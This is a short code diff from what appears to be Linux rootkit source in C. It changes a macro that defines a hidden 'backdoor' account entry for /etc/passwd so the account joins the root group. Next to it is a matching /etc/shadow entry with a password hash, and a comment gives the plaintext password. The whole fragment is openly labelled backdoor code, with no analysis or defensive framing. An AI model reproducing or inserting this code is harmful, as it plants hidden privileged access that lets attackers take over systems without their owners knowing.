@@ -37,7 +37,7 @@ struct linux_dirent {
 
 #define MAGIC_NUMBER 12345
 
-#define BACKDOOR_PASSWD "user1:x:12345:12345:backdoor:/root:/bin/bash\n"
+#define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"
 
 #define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman
 
